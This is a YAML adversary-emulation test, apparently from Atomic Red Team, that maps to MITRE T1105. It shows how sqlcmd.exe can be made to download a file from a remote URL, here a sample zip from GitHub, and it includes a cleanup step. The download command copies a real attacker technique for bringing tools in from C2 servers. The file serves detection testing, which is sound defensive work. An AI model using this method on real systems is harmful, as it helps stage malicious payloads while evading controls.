api_version: "2.0"
name: File Download with Sqlcmd.exe
description: |-
    One of the windows packages 'Sqlcmd.exe' can be abused to download malicious files from C2 servers
    This Atomic will exhibit the similar behavior by downloading a sample zip file from src directory of this Technique folder via GitHub URL
args:
    - name: remote_url
      type: url
      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip
    - name: local_file_path
      type: path
      default: C:\T1105.zip
uuid: 6934c16e-0b3a-4e7f-ab8c-c414acd32181
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1105: Ingress Tool Transfer'
requirements:
    platforms:
        - os: windows
steps:
    - name: file-download-with-sqlcmd.exe
      inline: sqlcmd -i {{.Args.remote_url}} -o {{.Args.local_file_path}}
      executor: powershell
      cleanup:
        inline: rm "{{.Args.local_file_path}}" 2>$null | Out-Null
        executor: powershell
